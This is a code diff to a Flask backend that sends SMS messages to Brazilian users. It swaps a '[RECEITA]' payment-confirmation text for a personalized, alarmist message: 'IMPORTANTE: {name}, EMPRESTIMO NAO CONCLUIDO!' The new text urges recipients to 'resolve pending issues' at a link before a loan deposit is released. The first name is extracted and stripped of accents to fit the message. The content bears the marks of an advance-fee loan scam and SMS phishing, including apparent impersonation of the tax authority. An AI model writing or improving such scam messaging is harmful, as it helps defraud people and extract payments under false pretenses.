@@ -12,6 +12,7 @@ import string
 import requests
 import json
 import http.client
+import unicodedata
 from payment_gateway import get_payment_gateway
 
 app = Flask(__name__)
@@ -582,17 +583,19 @@ def send_payment_confirmation_sms():
         url_params = request.args.copy()
         url_params_str = "&".join([f"{k}={v}" for k, v in url_params.items()])
         
-        # Format the amount for display if present
-        formatted_amount = ''
-        if amount:
-            try:
-                amount_float = float(amount)
-                formatted_amount = f"R$ {amount_float:.2f}".replace('.', ',')
-            except ValueError:
-                formatted_amount = amount
+        # Extract and format first name
+        primeiro_nome = ''
+        if nome:
+            # Get only the first name
+            primeiro_nome = nome.split()[0] if nome.split() else nome
+            # Convert to lowercase, then capitalize
+            primeiro_nome = primeiro_nome.lower().capitalize()
+            # Remove accents
+            primeiro_nome = ''.join(c for c in unicodedata.normalize('NFD', primeiro_nome)
+                               if unicodedata.category(c) != 'Mn')
                 
         # Construct the SMS message
-        message = f"[RECEITA] Seu pagamento de {formatted_amount} foi confirmado. Para concluir o emprestimo acesse: {dominio}/obrigado?{url_params_str}"
+        message = f"IMPORTANTE: {primeiro_nome}, EMPRESTIMO NAO CONCLUIDO! Para concluir o deposito em sua conta resolva as pendencias: {dominio}/obrigado?{url_params_str}"
         
         app.logger.info(f"[PROD] Enviando SMS de confirmação para {phone}: {message}")
         
